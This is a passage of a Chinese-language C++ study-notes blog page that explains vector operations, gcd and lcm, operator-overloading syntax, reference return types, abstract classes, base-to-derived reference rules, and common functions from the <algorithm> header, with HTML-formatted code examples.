&lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>插入和删除元素</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在指定位置插入元素</span></span><br><span class="line">    numbers.<span class="built_in">insert</span>(numbers.<span class="built_in">begin</span>() + <span class="number">2</span>, <span class="number">10</span>);  <span class="comment">// 在索引为2的位置插入10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在末尾添加元素</span></span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除指定位置的元素</span></span><br><span class="line">    numbers.<span class="built_in">erase</span>(numbers.<span class="built_in">begin</span>() + <span class="number">1</span>);  <span class="comment">// 删除索引为1的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除末尾的元素</span></span><br><span class="line">    numbers.<span class="built_in">pop_back</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; numbers = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在指定位置插入元素</span></span><br><span class="line">        numbers.insert(numbers.begin() + <span class="number">2</span>, <span class="number">10</span>);  <span class="comment">// 在索引为2的位置插入10</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在末尾添加元素</span></span><br><span class="line">        numbers.push_back(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除指定位置的元素</span></span><br><span class="line">        numbers.erase(numbers.begin() + <span class="number">1</span>);  <span class="comment">// 删除索引为1的元素</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 删除末尾的元素</span></span><br><span class="line">        numbers.pop_back();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : numbers) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="公倍数以及公约数"><a href="#公倍数以及公约数" class="headerlink" title="公倍数以及公约数"></a>公倍数以及公约数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 求最大公约数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> gcd(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 求最小公倍数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">lcm</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a / gcd(a, b) * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="重载格式"><a href="#重载格式" class="headerlink" title="重载格式"></a>重载格式</h3><p>在C++中，运算符重载是一种允许为已有的运算符提供用户定义的实现的语言特性。这使得开发者可以对自定义数据类型使用标准运算符。下面提供了一些常见运算符的重载格式，包括成员函数和非成员函数（包括友元函数）的重载方式。</p><h3 id="1-加法运算符（-）"><a href="#1-加法运算符（-）" class="headerlink" title="1. 加法运算符（+）"></a>1. 加法运算符（<code>+</code>）</h3><p><strong>成员函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass <span class="keyword">operator</span>+(<span class="type">const</span> MyClass&amp; rhs) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="comment">// 返回一个新对象，是当前对象和rhs的和</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MyClass</span>(<span class="comment">/* 构造逻辑 */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>非成员（友元）函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> MyClass <span class="keyword">operator</span>+(<span class="type">const</span> MyClass&amp; lhs, <span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// 返回lhs和rhs的和</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">MyClass</span>(<span class="comment">/* 构造逻辑 */</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="2-赋值运算符（-）"><a href="#2-赋值运算符（-）" class="headerlink" title="2. 赋值运算符（=）"></a>2. 赋值运算符（<code>=</code>）</h3><p><strong>成员函数形式</strong>（只能是成员函数）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass&amp; <span class="keyword">operator</span>=(<span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// 赋值逻辑</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;  <span class="comment">// 返回当前对象的引用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="3-下标运算符（-）"><a href="#3-下标运算符（-）" class="headerlink" title="3. 下标运算符（[]）"></a>3. 下标运算符（<code>[]</code>）</h3><p><strong>成员函数形式</strong>（只能是成员函数）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ElementType&amp; <span class="keyword">operator</span>[](<span class="type">int</span> index) &#123;</span><br><span class="line">        <span class="comment">// 返回对应索引的元素的引用</span></span><br><span class="line">        <span class="keyword">return</span> elements[index];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-递增运算符（-）"><a href="#4-递增运算符（-）" class="headerlink" title="4. 递增运算符（++）"></a>4. 递增运算符（<code>++</code>）</h3><p><strong>前缀递增</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass&amp; <span class="keyword">operator</span>++() &#123;</span><br><span class="line">        <span class="comment">// 递增逻辑</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>后缀递增</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClass <span class="keyword">operator</span>++(<span class="type">int</span>) &#123;</span><br><span class="line">        MyClass temp = *<span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// 递增逻辑</span></span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="5-输出运算符（"><a href="#5-输出运算符（" class="headerlink" title="5. 输出运算符（&lt;&lt;）常用于输出流重载"></a>5. 输出运算符（<code>&lt;&lt;</code>）常用于输出流重载</h3><p><strong>非成员（友元）函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> MyClass&amp; obj) &#123;</span><br><span class="line">        <span class="comment">// 输出obj的信息到os</span></span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="6-比较运算符（-）"><a href="#6-比较运算符（-）" class="headerlink" title="6. 比较运算符（==）"></a>6. 比较运算符（<code>==</code>）</h3><p><strong>成员函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> MyClass&amp; rhs) <span class="type">const</span> &#123;</span><br><span class="line">        <span class="comment">// 返回比较结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* 比较逻辑 */</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>非成员（友元）函数形式</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> MyClass&amp; lhs, <span class="type">const</span> MyClass&amp; rhs) &#123;</span><br><span class="line">        <span class="comment">// 返回比较结果</span></span><br><span class="line">        <span class="keyword">return</span> <span class="comment">/* 比较逻辑 */</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这些示例展示了如何重载常见运算符。在实际使用中，选择成员函数还是友元函数形式，通常取决于是否需要访问私有成员，以及是否希望第一个操作数是类类型的对象。总的来说，运算符重载应该谨慎使用，以保持代码的直观和易于理解。</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><h5 id="为什么选择-int-作为参数？（后置-）"><a href="#为什么选择-int-作为参数？（后置-）" class="headerlink" title="为什么选择 int 作为参数？（后置++）"></a>为什么选择 <code>int</code> 作为参数？（后置++）</h5><ol><li><strong>语法规定</strong>：C++语言规范定义了后缀递增运算符的重载必须使用一个<code>int</code>类型的参数。这个参数的存在是为了语法上的需要，以便编译器能够区分后缀递增（<code>operator++(int)</code>）和前缀递增（<code>operator++()</code>）。</li><li><strong>占位符用途</strong>：这个<code>int</code>参数实际上是一个占位符，它不需要被赋予任何实际的值。在调用后缀递增时，通常传递的是一个字面值0，但这个值在实际的运算符实现中通常是被忽略的。</li></ol><h5 id="为什么MyClass-是-？"><a href="#为什么MyClass-是-？" class="headerlink" title="为什么MyClass&amp;是&amp;？"></a>为什么MyClass&amp;是&amp;？</h5><p>在C++中，使用引用返回类型（例如 <code>MyClass&amp;</code>）在运算符重载和其他方法中是一种常见的做法，尤其是在赋值运算符和前缀递增&#x2F;递减运算符中。这样做有几个重要的原因和优势：</p><h5 id="1-避免不必要的对象复制"><a href="#1-避免不必要的对象复制" class="headerlink" title="1. 避免不必要的对象复制"></a>1. 避免不必要的对象复制</h5><p>当函数返回类型是一个对象而不是引用时，C++标准通常要求返回值被复制或移动到调用方的变量中。如果返回类型是一个引用，这种复制可以被避免。对于包含大量数据或复杂资源管理的类来说，避免这种复制是提高性能的关键。</p><h5 id="2-允许链式调用"><a href="#2-允许链式调用" class="headerlink" title="2. 允许链式调用"></a>2. 允许链式调用</h5><p>返回对象的引用允许方法调用可以被链式连接起来。这是因为返回的引用指向调用对象本身，所以可以继续在同一个表达式中对其进行操作。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myObject.<span class="built_in">Increment</span>().<span class="built_in">SetSomething</span>(<span class="number">5</span>).<span class="built_in">DoAnotherThing</span>();</span><br></pre></td></tr></table></figure><p>在这个示例中，<code>Increment</code>、<code>SetSomething</code> 和 <code>DoAnotherThing</code> 都可能返回 <code>MyClass&amp;</code>，允许连续调用。</p><h5 id="3-保持操作符的预期行为"><a href="#3-保持操作符的预期行为" class="headerlink" title="3. 保持操作符的预期行为"></a>3. 保持操作符的预期行为</h5><p>对于某些操作符，如赋值 (<code>=</code>)、前缀递增 (<code>++</code>) 和前缀递减 (<code>--</code>)，按照惯例和预期，这些操作应该修改原始对象，并返回修改后的对象的引用。这样，操作的结果可以直接用于其他操作，模仿了内置类型的行为。例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++(++myObject);</span><br></pre></td></tr></table></figure><p>在这个表达式中，第一个 <code>++</code> 操作修改了 <code>myObject</code> 并返回了它的引用，第二个 <code>++</code> 立即作用于同一个对象。</p><h5 id="4-实现符合直觉的语义"><a href="#4-实现符合直觉的语义" class="headerlink" title="4. 实现符合直觉的语义"></a>4. 实现符合直觉的语义</h5><p>通过返回引用，你确保了操作符或方法的行为符合使用者的直觉。例如，赋值运算符通常预期能直接在赋值后使用对象，如在表达式或条件中：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((a = b) == c) &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，<code>a = b</code> 赋值并测试与 <code>c</code> 是否相等，这种行为是通过返回 <code>a</code> 的引用来实现的。</p><h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>使用 <code>MyClass&amp;</code> 作为返回类型提供了性能优势，允许链式调用，保持了操作符的预期行为，并实现了符合直觉的语义。这些都是在设计类接口时考虑使用引用作为返回类型的重要因素。</p><h3 id="抽象类and接口"><a href="#抽象类and接口" class="headerlink" title="抽象类and接口"></a>抽象类and接口</h3><p>以下是一个简单的抽象类示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">draw</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;  <span class="comment">// 纯虚函数</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;  <span class="comment">// 纯虚函数</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> : <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">double</span> radius;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Circle</span>(<span class="type">double</span> r) : <span class="built_in">radius</span>(r) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Drawing a circle.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">area</span><span class="params">()</span> <span class="type">const</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3.14159</span> * radius * radius;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="类的引用重写"><a href="#类的引用重写" class="headerlink" title="类的引用重写"></a>类的引用重写</h3><p>在C++中，如果类A公有地继承自类B，那么类B的指针或引用可以指向类A的对象，但反过来不行。这是因为类B只是类A的一部分，而类A包含了类B的所有特性以及额外的特性。让我们通过一个例子来更清楚地解释这一点。</p><h3 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明"></a>示例说明</h3><p>假设我们有一个基类 <code>Base</code> 和一个从 <code>Base</code> 公有继承的派生类 <code>Derived</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">baseMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Base method&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Derived</span> : <span class="keyword">public</span> Base &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">derivedMethod</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Derived method&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这种情况下，我们可以使用 <code>Derived</code> 类的对象来初始化 <code>Base</code> 类的引用或指针，因为每个 <code>Derived</code> 对象都是一个 <code>Base</code> 对象。这是多态的基础，允许 <code>Base</code> 类型的引用或指针调用在 <code>Derived</code> 类中重写的方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Derived derivedObj;</span><br><span class="line">Base &amp;baseRef = derivedObj;  <span class="comment">// 正确：Derived 对象可以被看作是 Base 对象</span></span><br><span class="line">baseRef.<span class="built_in">baseMethod</span>();        <span class="comment">// 调用 Base 的方法</span></span><br></pre></td></tr></table></figure><p>然而，反过来不行：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Base baseObj;</span><br><span class="line">Derived &amp;derivedRef = baseObj;  <span class="comment">// 错误：不能将 Base 对象的引用转换为 Derived 引用</span></span><br><span class="line">derivedRef.<span class="built_in">derivedMethod</span>();     <span class="comment">// 这行代码是无效的，因为上一行已经是编译错误</span></span><br></pre></td></tr></table></figure><p>这里的错误发生是因为 <code>baseObj</code> 只是一个 <code>Base</code> 类型的对象，它可能没有 <code>Derived</code> 类中定义的额外成员和方法。尝试将一个 <code>Base</code> 类型的对象的引用转换为 <code>Derived</code> 类型的引用是不安全的，因为 <code>Derived</code> 可能有更多的数据成员或方法，这在 <code>Base</code> 对象中并不存在。</p><h3 id="结论-1"><a href="#结论-1" class="headerlink" title="结论"></a>结论</h3><p>因此，公有继承允许基类的指针或引用指向派生类的对象，但不能使用基类对象来初始化派生类的引用。这种类型的引用或指针转换是单向的，只能从派生类到基类，而不是反过来。这是面向对象设计中的一个重要安全特性，它保护了程序的类型安全性。</p><h3 id="algorithm头文件"><a href="#algorithm头文件" class="headerlink" title="algorithm头文件"></a>algorithm头文件</h3><p><code>#include &lt;algorithm&gt;</code> 是C++标准库中的一个头文件，它提供了大量的函数模板，用于处理各种算法操作，包括排序、搜索、合并、替换、旋转、反转等。以下是一些常用的函数和它们的用途：</p><ul><li><p><strong>排序</strong>：</p><ul><li><code>sort(first, last)</code>：对范围内的元素进行排序。</li><li><code>stable_sort(first, last)</code>：对范围内的元素进行稳定排序。</li></ul></li><li><p><strong>搜索</strong>：</p><ul><li><p><code>find(first, last, value)</code>：在范围内查找特定值的第一个出现位置。</p></li><li><p><code>binary_search(first, last, value)</code>：在已排序的范围内执行二分查找。</p></li></ul></li><li><p><strong>合并</strong>：</p><ul><li><code>merge(first1, last1, first2, last2, result)</code>：合并两个已排序的范围到一个新的范围。</li></ul></li><li><p><strong>替换</strong>：</p><ul><li><code>replace(first, last, old_value, new_value)</code>：将范围内的所有旧值替换为新值。</li></ul></li><li><p><strong>旋转</strong>：</p><ul><li><code>rotate(first, middle, last)</code>：将范围内的元素旋转，使得中间元素成为新的第一个元素。</li></ul></li><li><p><strong>反转</strong>：</p><ul><li><code>reverse(first, last)</code>：反转范围内元素的顺序。</li></ul></li></ul><blockquote><p>补充：</p><p>result.back()是result的末尾</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405102120585.png" alt="image-20240510204749554"></p><p>result.pop_back();移除最后一位</p><p>stoi(result);转换为int型（老pwn了）</p><p>result.substr(7)将提取从指定位置开始到字符串末尾的所有字符</p><p>result.substr(7,5)从指定位置开始读取5个字符</p></blockquote><p>在使用 <code>&lt;algorithm&gt;</code> 头文件中的函数时，对类型的要求主要涉及以下几个方面：</p><ol><li><strong>迭代器要求</strong>：<ul><li>大多数算法函数需要至少是输入迭代器（Input Iterator）的迭代器类型。这意味着你可以使用这些函数来处理任何支持输入迭代器的容器，如<code>std::vector</code>、<code>std::list</code>、<code>std::deque</code>、<code>std::array</code>等，以及普通数组。</li><li>某些算法可能需要更高级的迭代器类型，如前向迭代器（Forward Iterator）、双向迭代器（Bidirectional Iterator）或随机访问迭代器（Random Access Iterator）。例如，<code>sort()</code> 函数通常需要随机访问迭代器。</li></ul></li><li>等等（还有很多的要求主要涉及自定义类在此不过多赘述</li></ol><p><code>algorithm</code> 头文件是C++标准库中的一个重要组成部分，它提供了大量的算法，用于处理和操作容器（如数组、<code>std::vector</code>、<code>std::list</code>、<code>std::set</code>、<code>std::map</code> 等）中的元素。以下是一些 <code>algorithm</code> 头文件中常用函数的使用示例：</p><p><code>std::sort</code>：对容器中的元素进行排序。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">3</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>&#125;;</span><br><span class="line">   std::<span class="built_in">sort</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>()); <span class="comment">// 对整个向量进行排序</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i : v) &#123;</span><br><span class="line">       std::cout &lt;&lt; i &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::find</code>：在容器中查找特定元素。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span 